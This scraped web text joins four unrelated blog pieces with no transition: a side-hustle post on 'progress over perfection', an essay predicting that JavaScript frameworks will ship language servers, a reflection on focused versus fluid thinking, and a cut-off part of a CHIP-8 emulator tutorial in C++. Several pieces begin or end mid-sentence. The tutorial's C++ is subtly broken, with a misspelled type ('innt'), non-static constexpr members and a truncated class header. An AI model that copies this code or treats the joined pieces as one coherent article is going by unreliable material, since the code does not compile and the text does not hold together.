least. I decided to use the “progress over perfection” mantra by making sure the uploading, editing, removing, and retrieving of the photos, from a functionality point of view, was “perfect”</p><p>However, the way the user uploaded the photos and then viewing them was shocking, “perfect” was just a dot on the horizon.&nbsp;</p><p>That said, I went with it as I wanted to get the app published on both the <a href="https://apps.apple.com/us/app/id1519992229">Apple App Store</a> and <a href="https://play.google.com/store/apps/details?id=uk.co.phhdigital.baitcamp">Google Play</a> as quickly as possible.&nbsp;</p><p>5 months after the initial idea came to me, I had published the app on both platforms. WAHOO!</p><p>After feedback from people testing version 1. And the fact I wasn’t happy with the photo upload/viewing features. I have been able to start work on version 1.1 to sort this problem out.</p><p>Another day or two and I will have a slick way of managing the photos. Be able to release an update very quickly. As well as ironing out a few bugs that have come to light.</p><p>I genuinely believe if I had kept on working on the app until I was entirely happy with the photo functionality, I wouldn’t have it published or have people downloading the app and using it.</p><p>The key here was “progress over perfection” to get something live that was usable, then go from there.</p><h2 id="h-side-hustling-and-what-you-need-to-learn"><span id="Side_Hustling_and_What_You_Need_To_Learn"></span>Side Hustling and What You Need To Learn<span></span></h2><p>When it comes to other aspects of side hustling, I’m still “newborn” in a lot of the skills you need.&nbsp;</p><p>Writing blog posts, writing social media posts, copywriting, creating nice-looking webpages, building sales funnels, creating ads, shooting walkthroughs for YouTube, recording video sales letters, editing videos, coming up with offers, researching, scheming and plotting, creating eBooks, creating eBook covers, creating eBook mock-ups, recording podcasts, editing podcasts.</p><p>How did I come up with that list of things to do? I looked at my planner at what tasks I wanted to achieve over the last 2 weeks.&nbsp;</p><p>That’s on top of coding 3 software products by myself. Working 8-4 Monday through Thursday. And, having a life, like spending time with my wife, playing guitar, and going fishing.</p><p>It can be very overwhelming.&nbsp;</p><p>You see how great other people are at all these other things and want your stuff to be as “perfect” as theirs</p><p>That’s why this new mantra has been a bit of a breakthrough for me.</p><h2 id="h-progress-over-perfection-and-switching-your-mindset"><span id="Progress_Over_Perfection_and_Switching_Your_Mindset"></span>Progress Over Perfection and Switching Your Mindset<span></span></h2><p>As I’ve touched upon. For certain aspects of my day to day I would apply “progress over perfection”. Not all aspects though.</p><p>Hearing this really got me thinking about what I wanted to achieve.&nbsp;</p><p>One thing it also did was remove some fear I had around things.&nbsp;</p><p>For example, I had started digging deep into the concept of creating online sales funnels to promote my products and reach my “golden goose” of 350 paying customers.</p><p>My dream is to work for myself running a software product. After a bit of number crunching, I worked out I would need 350 monthly subscribers for me to realize my dream.&nbsp;</p><p>Sales funnels could help me achieve this.</p><h3 id="h-sales-funnel-progress-over-perfection"><span id="Sales_Funnel_Progress_Over_Perfection"></span>Sales Funnel Progress Over Perfection<span></span></h3><p>This is where the fear kicked in. I was worried that I would create a sales funnel, it would completely bomb, and I would feel like a failure.&nbsp;</p><p>I wanted my sales funnels to be successful as soon as I start driving traffic to it. If this were a software product, I wouldn’t think like that. I know they will be some bugs and users would probably want something different than what I had built.</p><p>After consuming a lot of content around the sales funnel process and how even the most experienced “funnel hackers” can’t get their funnel to work out of the gate.&nbsp;</p><p>I decided that I just need to get it out there and see what “feedback” I get.</p><p>So, I continued to put it together as best I could, giving myself a time constraint that it must be done by the end of that week. Then the week after I could drive some paid traffic to it.</p><p>I got the opt-in page up and running, where someone could submit their details and in return get a free eBook user guide.</p><p>Next, I spent most of my time working on the sales page and putting together an offer and pricing.&nbsp;</p><p>Thirdly, I added a “One Time Offer” that the person would be shown if they subscribed to the product I was promoting on the sales page.</p><p>Finally, I put together an email sequence that would be sent to anyone who opted in for the free eBook, as a follow up to get them to revisit my funnel.</p><p>The next week I created a Facebook ad campaign and got loads of people into the funnel. Guess how many sales I made?</p><p>ZERO.</p><h3 id="h-analyzing-the-results"><span id="Analyzing_the_Results"></span>Analyzing the Results<span></span></h3><p>Sounds terrible right? It was, but I wasn’t downhearted.&nbsp;</p><p>Looking into the stats, the opt-in page was working. I was getting almost 45% of the visitors to put in their email address and request a copy of the eBook.</p><p>Yes, no one bought from me. I knew that part of my sales funnel did work. However, I was building an email list of people that I could keep in contact with, which I hadn’t be able to do before.</p><p>“Progress over perfection”.</p><p>I ended up scrapping this funnel as I still didn’t ‘convert’ after a few attempts at rewriting parts of the sales page.</p><p>Taking the learnings from the opt-in success, I created a brand-new funnel. This targeted a different group of people. Again, this funnel wasn’t the success I wanted. My opt-in rate was still high, 35% and I got my first ever paying customer.</p><p>Someone signed up and subscribed to <a href="https://outflash.xyz/">my software product called Outflash</a>. They even took my up one-time offer.</p><p>I was blown away. Yes, it wasn’t the riches you pray for, but I had made progress on this skill.</p><p>Progress! Progress towards what I deem successful.</p><h2 id="h-podcasting-and-getting-yourself-out-there"><span id="Podcasting_and_Getting_Yourself_Out_There"></span>Podcasting and Getting Yourself Out There<span></span></h2><p>A problem with being a developer, is you think it will be like the movie Field of Dreams. “Build it and they will come”. With a software product, this NEVER happens.</p><p>Someone said if you want to get yourself out there to promote your products and services. Use a platform or media that you enjoy yourself. For me this was podcasting.</p><p>I’m an avid podcast listener. Whether it be working out, going for a run, listening while coding. I even put a podcast on while cooking a Sunday Dinner.</p><p>Starting a podcast can be scary though. What do I talk about? Do I have enough content to get past the first 10 episodes? How do I even publish a podcast? Which platforms do I publish to?</p><h3 id="h-excuses-excuses-just-do-it"><span id="Excuses,_Excuses,_Just_Do_It"></span>Excuses, Excuses, Just Do It<span></span></h3><p>Having mild success with the sales funnels gave me a lot of belief in the saying “Just Do It”.</p><p>One of the podcasts I listen to is by two guys that have launched their own podcasting hosting and publishing platform. I know, a bit Inception right!</p><p>So, I decided to use their platform to publish and host <a href="https://www.philliphughes.co.uk/podcast/">my podcast</a>. Which platforms to publish to? Their service had guides on how to publish to <a href="https://podcasts.apple.com/gb/podcast/find-your-side-hustle/id1523991465">Apple</a> and <a href="https://podcasts.google.com/feed/aHR0cHM6Ly9mZWVkcy50cmFuc2lzdG9yLmZtL2ZpbmQteW91ci1zaWRlLWh1c3RsZQ?sa=X&amp;ved=0CBUQ27cFahcKEwiIrMe2-eLqAhUAAAAAHQAAAAAQAQ">Google podcasts</a>, <a href="https://open.spotify.com/show/19pwsqTl75RSGrhhrsFIWW">Spotify</a>, and <a href="https://www.stitcher.com/podcast/find-your-side-hustle">Stitcher</a>. I didn’t overthink it, I registered with those 4 providers first and thought, “progress over perfection”, I can publish to more platforms later.</p><p>People also think they need a mass of equipment to record and edit a podcast. I was on a roll; nothing was stopping me from getting my first episode out to the world.&nbsp;</p><p>Quickly opening Amazon and searching for “cheap podcast mic”. I bought the 3<sup>rd</sup> one I saw for £20, with Amazon Prime it was delivered the next day.</p><p>In another quick search for “free podcast editing software,” I found a piece of software that I could do basic audio editing with, like snipping or increasing the volume.&nbsp;</p><h3 id="h-other-people-skills-to-progress-over-perfection"><span id="Other_People_Skills_To_Progress_Over_Perfection"></span>Other People Skills To Progress Over Perfection<span></span></h3><p>The last two pieces of the podcasting puzzle were that I needed a logo/header for the podcast that will be unique to me and my chosen topic.</p><p>I have used Fiverr in the past and thought it would be a good place to find someone to do it for me, quickly.&nbsp;</p><p>If I didn’t like it, I could always change it a few months down the line. I found someone who had a decent portfolio of similar work, that wasn’t too pricy. I put the order in, with a description of what I was looking for, and forgot about it for the rest of the evening.</p><p>While the logo was being designed, I needed to get together a list of episode ideas so I could record a least a handful to get me started.</p><p>This time I turned to Evernote, created …</p></div></article></main></div></div></div>

<p>When Svelte 3 <a href="https://news.ycombinator.com/item?id=19719118">launched</a> in 2019, the top demanded feature was TypeScript support. And when TypeScript support was <a href="https://twitter.com/sveltejs/status/1285627864310743043?lang=en">finally announced</a> in 2020, the reception was ecstatic.</p>
<p>But the secret is - not much needed to change in Svelte's core code. It simply added <a href="https://github.com/sveltejs/language-tools">language tooling</a> to its core responsibilities. Svelte already had TypeScript preprocessors for years - but it wasn't considered to have "TypeScript support" until the VS Code extension shipped.</p>
<p>I think this is indicative of a broader trend:</p>
<p><strong>In the <a href="https://www.swyx.io/js-third-age/">Third Age of JavaScript</a>, all frameworks will provide their own language servers.</strong></p>
<p>By way of proof, you see this pattern emerging in other frameworks as well:</p>
<ul>
  <li><a href="https://github.com/vuejs/vetur">Vetur</a> is standard tooling for all Vue.js developers</li>
  <li>React strongly recommends <a href="https://reactjs.org/docs/hooks-rules.html#eslint-plugin">ESLint checks</a> to enforce the Rules of Hooks (this is probably an understatement; probably no React professional would trust themselves to write Hooks right without the ESLint checker today)</li>
  <li>Angular has the <a href="https://github.com/angular/vscode-ng-language-service">Angular Language Service</a> (thanks <a href="https://twitter.com/mhartington/status/1335338641447587840">Mike</a>) and Ember is <a href="https://marketplace.visualstudio.com/items?itemName=lifeart.vscode-ember-unstable">working on it</a> (thanks <a href="https://twitter.com/vaier/status/1335482247810592768?s=20">Alex</a>)</li>
  <li>Tailwind Labs' <a href="https://blog.tailwindcss.com/welcoming-brad-cornes-to-the-tailwind-team">first hire</a> was Brad Cornes, who made the Tailwind IntelliSense plugin</li>
  <li><a href="https://github.com/graphql/graphiql">GraphiQL</a>, <a href="https://relay.dev/docs/en/installation-and-setup#set-up-relay-compiler">Relay Compiler</a> and <a href="https://www.apollographql.com/docs/devtools/editor-plugins/">Apollo VS Code</a> can be regarded as language servers for GraphQL development</li>
</ul>
<p>Linting, typing, always-running-compilation and other forms of write-time checks and optimizations are not new. In fact, when dev teams write unit tests and lint rules, they are essentially creating their own bespoke language server for their own app. What's new is that <strong>giving realtime feedback is now a responsibility shared by frameworks</strong>. This standardization increases productivity both when starting a new project and moving between projects.</p>

  <h2 id="why"><a href="#why">Why</a></h2>
  <p>The proximate <em>reason</em> this is a thing is simple: Cost.</p>
  <p>IBM coined the term "<a href="https://devops.com/shift-left-can-you-be-left-out/">Shift Left</a>" after finding that <a href="https://www.researchgate.net/publication/255965523_Integrating_Software_Assurance_into_the_Software_Development_Life_Cycle_SDLC">the earlier you catch errors, the cheaper they are to fix</a> (<a href="https://twitter.com/mknz/status/1335351649720668161?s=20">Neil</a> points out that this research goes as far back as <a href="https://dzone.com/articles/real-cost-change-software">Barry Boehm in the 1980s</a>). If you arrange the software development lifecycle from left (design) to right (production), the idea is that if you shift your errors "left" then you'd save actual money by catching errors earlier (<a href="https://gist.github.com/Morendil/6d664bf990c17ea0f88f9bb0cc403c64">this is disputed</a>).</p>
  <p>Of course, the flip side of Cost is <em>Developer Experience</em>. <strong>Cost is what our bosses pay, DX is what we <em>feel</em></strong>. And we always gravitate to tools that guide us down the <a href="https://blog.codinghorror.com/falling-into-the-pit-of-success/">pit of success</a>.</p>
  <p>You could translate this idea to modern terms:</p>
  <p>
    <img src="https://dev-to-uploads.s3.amazonaws.com/i/4nyfjt36m2ueummlqfsc.png" alt="Alt Text">
  </p>
  <p>And then plot the slow leftward shift of frameworks:</p>
  <p>
    <img src="https://dev-to-uploads.s3.amazonaws.com/i/3xvu11v9ayvaxnakzsk9.png" alt="Alt Text">
  </p>
  <p>Remember I said cost was a <em>proximate</em> reason. I believe there's a deeper, more fundamental reason.</p>

  <p>In 2017, Tom Dale of the Ember core team observed the first part of this evolution, that <a href="https://tomdale.net/2017/09/compilers-are-the-new-frameworks/">Compilers are the New Frameworks</a>.</p>
  <blockquote>
    <p>My current “investment thesis” is that what we call web frameworks are transforming from runtime libraries into optimizing compilers. When it comes to eking performance out of hand-authored JavaScript and accompanying runtime libraries, we’ve reached the point of diminishing returns.</p>
  </blockquote>
  <p>He was not only astoundingly right (Svelte is built from the ground up as a compiler) but this process is also not done (Next.js is arguably an optimizing compiler for React, but the React team itself is working on Selective Hydration and a <a href="https://twitter.com/dan_abramov/status/1259615094163607561">hybrid client/server model</a>). Every framework basically invents its own metalanguage (<a href="https://www.youtube.com/watch?v=QiR9viVIJgo">React</a>, <a href="https://gist.github.com/Rich-Harris/0f910048478c2a6505d1c32185b61934">Svelte</a>, <a href="https://medium.com/@llkktt/blog-707634e025cf">ActiveRecord</a>) to solve for developer experience under constraints of a more popular general purpose language, and this language will eventually want to be compiled.</p>
  <p>I'm simply extending this train of thought to its natural conclusion: what we call web frameworks are transforming from runtime libraries, into optimizing compilers <em>with first class language server support</em>.</p>
  <p>I don't know how unique this observation is but it felt revelatory <a href="https://twitter.com/swyx/status/1259121891555467264?s=20">when I first realized it</a>. After you observe the evolution of a few frameworks and developer platforms you start seeing the same movie play out over and over again. To offer better developer experience, you end up creating a language. A language needs a compiler. A compiler eventually wants a language server.</p>

  <p>Language servers do a lot of <a href="https://jeremybower.com/articles/undifferentiated-heavy-lifting-2-0.html">undifferentiated heavy lifting</a> - file watching, processing, reporting, supporting plugins for every IDE, and so on. If we're all going to be building language servers, why do we have to reinvent the wheel every time?</p>
  <p>
    <img src="https://dev-to-uploads.s3.amazonaws.com/i/s1ixc6yvv6b1xfj10ate.png" alt="Alt Text">
  </p>
  <p>Naturally, if language servers are the new bar for frameworks, those who <em>own</em> the common rails for the language server layer will do very well. Microsoft first developed the <a href="https://microsoft.github.io/language-server-protocol/">Language Server Protocol</a> for VSCode and <a href="https://www.infoworld.com/article/3088698/microsoft-backed-langauge-server-protocol-strives-for-language-tools-interoperability.html">standardized it in 2017</a>. This was a generous move that ensured the protocol would work with non-Microsoft IDEs like <a href="https://www.eclipse.org/community/eclipse_newsletter/2017/may/article1.php">Eclipse</a>, <a href="https://youtrack.jetbrains.com/issue/IDEABKL-7409">IntelliJ</a> and even <a href="https://www.vimfromscratch.com/articles/vim-and-language-server-protocol/">vim</a>, and non-Microsoft languages like <a href="https://visualstudiomagazine.com/articles/2020/07/01/pylance-vs-code.aspx">Python</a>. Because LSP is ironically language and tooling agnostic, you also greatly lower the barrier for entire generations of language and editor agnostic startups, like <a href="https://langserver.org/">Sourcegraph</a> and <a href="https://www.kite.com/">Kite</a>.</p>
  <p>Here's my advice for anyone who wants to make their dev tools project successful: <strong>time to learn how language servers work.</strong></p>
  <blockquote>
    <p>Author's note: Orta from the TS core team <a href="https://dev.to/orta/comment/18o1d">left a great comment</a> with more resources to learn about LSPs from Anders Hejlsberg and a coming "Build Server Protocol"!</p>

After all, you can’t build anything without a general idea of what you want to see in the world.</p><p>Adhering to an expectation is what makes us efficient, and allows us to be focused. But with this focus on the end goal, we lose serendipity and the free-flowing spirit that is required from great works of art.</p><p><span><strong>One of the great challenges is learning how to balance the rigidity of focus with the fluidity of exploration.</strong></span> It’s one I wrestle with personally, given that I want to write posts that are sensible and clear, but knowing that it takes a lot of meandering to arrive at the ideas that resonate most. I acknowledge the importance of having a schedule, but chunking my creative time into slots on a calendar feels like I’m sacrificing the freedom required to unearth interesting ideas.</p><p>Oftentimes, being able to name the problem goes a long way, and I’d like to delineate between the two styles of thought here:</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A03-Focused-thought-vs-fluid-thought.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A03-Focused-thought-vs-fluid-thought.png" alt="" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A03-Focused-thought-vs-fluid-thought.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A03-Focused-thought-vs-fluid-thought-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A03-Focused-thought-vs-fluid-thought-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A03-Focused-thought-vs-fluid-thought-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A03-Focused-thought-vs-fluid-thought-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p><span><strong>Focused Thought</strong></span> is what guides our work lives, primarily because it’s tied to a practical end result. This result has been imagined from the beginning, so Focused Thought is about investing the energy necessary to have the present moment catch up with that future goal. The most pressing example today would be all the people working tirelessly to create a coronavirus vaccine. They embarked on this journey knowing exactly what they wanted, and they will rigorously follow whatever road looks promising to get them to that goal.</p><p><span><strong>Fluid Thought</strong></span>, on the other hand, has no end state in mind. It’s thinking for the sake of thinking. There is no practical value to extract, no expectation to fulfill. It’s like being in a rowboat in a vast ocean without any particular place to go. All you must do is row aimlessly, and take in all the observations you make along your little journey.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A04-Rowing-in-the-ocean.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A04-Rowing-in-the-ocean.png" alt="" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A04-Rowing-in-the-ocean.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A04-Rowing-in-the-ocean-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A04-Rowing-in-the-ocean-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A04-Rowing-in-the-ocean-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/A04-Rowing-in-the-ocean-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>Fluid Thought is about emptying any desire to be productive or useful, and instead becoming a blank canvas for whatever your curiosity comes into contact with. An idea is no longer interesting because of what you can do with it; it’s interesting simply because it’s interesting. You don’t need to <a href="https://moretothat.com/knowledge-is-not-a-thing/" target="_blank" rel="noopener noreferrer">store it as knowledge</a> to regurgitate later, as coming into contact with it is all that matters.</p><p>This is a remarkably difficult thing to do, especially because we’ve been conditioned to learn with an end goal in mind. From grade school to college, we learn things because we have an exam to pass. When we enter the workplace, we learn because we want to “add value” to our team (and get paid in the process). When we do creative work, we learn because we want to build things that are useful for our audience.</p><p>The problem, however, is that all this conditioning goes against the actual nature of our minds. If you take 10 minutes to sit down and do nothing, you’ll see how random and sporadic your thoughts actually are. The mind is exploratory by nature, but we’ve trained it to think linearly because we have been incentivized to prioritize Focused Thought. After all, the more we tie our worth to <a href="https://moretothat.com/the-omnipresence-of-work/" target="_blank" rel="noopener noreferrer">the societal value we produce</a>, the more goal-oriented we become.</p><p>Fluid Thought is a return to how our minds actually work. Exploring without expecting is <a href="https://moretothat.com/what-is-the-present-moment/" target="_blank" rel="noopener noreferrer">what it means to be present</a>. Thinking without striving is <a href="https://moretothat.com/happiness-is-a-serious-matter/" target="_blank" rel="noopener noreferrer">what it means to be introspective</a>. By putting aside the desire to make something out of everything, we allow our childlike wonderment to re-emerge and learn from a truly earnest place.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/C01-Ocean-at-night.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/C01-Ocean-at-night.png" alt="" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/C01-Ocean-at-night.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/C01-Ocean-at-night-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/C01-Ocean-at-night-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/C01-Ocean-at-night-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/C01-Ocean-at-night-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>I try to keep this in mind as I navigate my path as a writer.</p><p>Since writing is such a cognitively demanding exercise, it’s dominated by the presence of Focused Thought. This is even more relevant since I also publish my work, which means that I can’t just blurt out random thoughts on a page, and expect the result to be cohesive enough to be digested by another mind. I have to take time to formulate my thoughts, let them marinate, and structure them so that they’re clear enough to whoever might come across my work.</p><p>However, writing with an end goal in mind makes my thinking rigid, and cuts off the tangential threads that are unwoven naturally when thought is more exploratory. Too much linear thinking can make writing feel like a task, where the completion of one piece just means that it’s time to go looking for another topic to discuss. Repeat this process long enough, and you can see why so many people become disillusioned with it fairly quickly.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D01-Such-a-grind.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D01-Such-a-grind.png" alt="" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D01-Such-a-grind.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D01-Such-a-grind-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D01-Such-a-grind-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D01-Such-a-grind-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D01-Such-a-grind-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>Fortunately, there is an antidote to this, and it applies to any form of expression:</p><p><span><strong>Introduce time for Fluid Thought on a regular basis.</strong></span></p><p>By giving yourself the space to explore without expectation, you give your mind the freedom to play with whatever idea it comes into contact with. There is nothing that idea has to become; there is nothing you need to store to use for later. All that matters is that you’re wandering about, spending time in a playground that will disappear shortly afterward.</p><p>The way I put this into practice is by journaling every single day. I think in the last two years, I may have missed just two sessions – that’s how important the practice is to me.</p><p>This is because journaling carries no expectations, and gives me the space to write without any judgment whatsoever. When I open up my journal each day, I have no clue what will be written down by the end of the entry. All I do is put my pen to paper, and have my hand act as a mere conduit to whatever my mind wants to explore. It can be nonsensical, it can be stupid, it can be forgotten.</p><p>And all of that is perfectly fine.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D02-Fluid-thinking-journal.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D02-Fluid-thinking-journal.png" alt="" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D02-Fluid-thinking-journal.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D02-Fluid-thinking-journal-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D02-Fluid-thinking-journal-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D02-Fluid-thinking-journal-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D02-Fluid-thinking-journal-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>Perhaps the greatest thing about Fluid Thought is that it reintroduces the beginner’s mind, or what the Zen Buddhists call <em>shoshin</em>. When you have no expectations, you drop all the defense mechanisms you’ve developed in your <a href="https://moretothat.com/pursue-mastery-not-status/" target="_blank" rel="noopener noreferrer">pursuit of mastery</a>, and reset your curiosity back to its baseline levels. This allows you to experiment with all kinds of novel ideas, as you have nothing to lose by doing so.</p><p>The same thing applies in the realm of learning. So much of what we learn is done for the purposes of what we can teach. But with Fluid Thought, we can read a book simply to enjoy it, without expecting any knowledge or wisdom in return for our attention. This is why I’ve been reading more fiction these days, as I know that I’m not delving into the pages so I can find material to write about afterward. I’m there to get lost in the story, and to be part of an adventure that is devoid of any obvious personal utility.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D03-Adventure-in-a-book.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D03-Adventure-in-a-book.png" alt="" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D03-Adventure-in-a-book.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D03-Adventure-in-a-book-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D03-Adventure-in-a-book-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D03-Adventure-in-a-book-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/12/D03-Adventure-in-a-book-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>The paradox of Fluid Thought is that it’s easily accessible, but is difficult to enter into. This is because we live in a world where we are rewarded to provide value, so Focused Thought will always feel more practical. An efficient hustle receives far more praise than an aimless meander, so having goals and visions will be the default setting our minds operate on.</p><p>But take this mindset out too far, and we will forever be slaves to the future. Focused Thought is inherently about looking ahead, whereas Fluid Thought is about being immersed in the moment. Paradoxically, you must balance both by dropping your present expectations to position yourself toward a brighter future.</p><p>I’m reminded here of a Daoist concept called <em>wu-wei</em>, which roughly translates to “effortless action.” It’s about moving alongside the fabric of reality with action, but doing it in a seamless manner so you don’t create friction. To maintain a sense of serenity while meeting the demands of your everyday life.</p><p>In the end, that might be the best way to frame the power of Fluid Thought.</p><p>_______________</p><div id="custom_html-5"><div><div>  <p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2019/09/Mailing-List-Blue-Sky-revised.png"><img src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2019/09/Mailing-List-Blue-Sky-revised.png" alt="" width="1500" height="790"></a></p><p>  If you enjoyed this post, consider joining the More To That newsletter.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody">  <p>In the <a href="https://river.codes/emulating-a-computer-part-1/">last part of this series</a> we built a CHIP-8 interpreter to execute all opcodes except for one, <code>Dxyn - DRW Vx, Vy, nibble</code>. To make this process easier, we’ll encapsulate our image memory and operations in an <code>Image</code> class. Our 64x32 frame will be represented as a single chunk of data in memory, where each pixel is a single byte:</p> <div><div><pre><code>0x000:|--------------------------------------------------------------|
0x040:|                                                              |
0x080:|                                                              |
0x0C0:|                                                              |
      ...
0x7C0:|--------------------------------------------------------------|
</code></pre></div></div> <p>For our image above, we need to store three pieces of data: the number of rows, number of cols, and the starting address of the image memory (which <a href="https://river.codes/demystifying-malloc"><code>malloc</code></a> gives us). With this address pointing to the top-left corner of the memory, addressing individual pixels is fairly trivial. Some examples:</p> <div><div><pre><code>img[col=0, row=0] = img[0]
img[col=0, row=1] = img[width]
img[col=1, row=3] = img[3*width+1]
</code></pre></div></div> <p>Okay, we should be ready to write the header.</p> <div><div><pre><code><span>// image.h</span>

<span>class</span> <span>Image</span> <span>{</span>

</code></pre></div></div> <p>What we need to pay attention to is that we’re dynamically allocating data that will be owned by this class.

</code></pre></div></div> <p>I like to use rows and columns here rather than x and y because I rarely forgot what a row is, but I often forget what an “x” is. Our <code>At</code> function returns a <code>uint8_t&amp;</code> so that we can use it for both getting and setting individual pixels. This is bad for encapsulation, but is common among image APIs. We also added a handy <code>DrawToStdout</code> so that we can view the image in our console until we set up graphical output later. Now we can add our frame to the CPU and work out an implementation.</p> <div><div><pre><code><span>// cpu_chip8.h</span>

<span>class</span> <span>CpuChip8</span> <span>{</span>
 <span>public:</span>
  <span>constexpr</span> <span>innt</span> <span>kFrameWidth</span> <span>=</span> <span>64</span><span>;</span>
  <span>constexpr</span> <span>innt</span> <span>kFrameHeight</span> <span>=</span> <span>32</span><span>;</span>

  <span>CpuChip8</span><span>()</span> <span>:</span> <span>frame_</span><span>(</span><span>kFrameWidth</span><span>,</span> <span>kFrameHeight</span><span>)</span> <span>{}</span>
  <span>...</span>
 <span>private:</span>
  <span>...</span>
  <span>Image</span> <span>frame_</span><span>;</span>
<span>};</span>
</code></pre></div></div> <p>Finally we’ll talk about how CHIP-8 performs drawing. All drawing is done in terms of an XOR operation of a sprite onto the current and only frame buffer. All sprites are defined as images with a depth of 1-bit (each pixel on or off), a width of 8, and a variable height. The width limitation is due to the fact that each pixel in the sprite is only a single bit. Let’s take a look at the fontset earlier and try to decode a digit.</p> <div><div><pre><code>0xF0, 0x90, 0x90, 0x90, 0xF0, // 0

0xF0 is 1111 0000 -&gt; XXXX
0x90 is 1001 0000 -&gt; X  X
0x90 is 1001 0000 -&gt; X  X
0x90 is 1001 0000 -&gt; X  X
0xF0 is 1111 0000 -&gt; XXXX
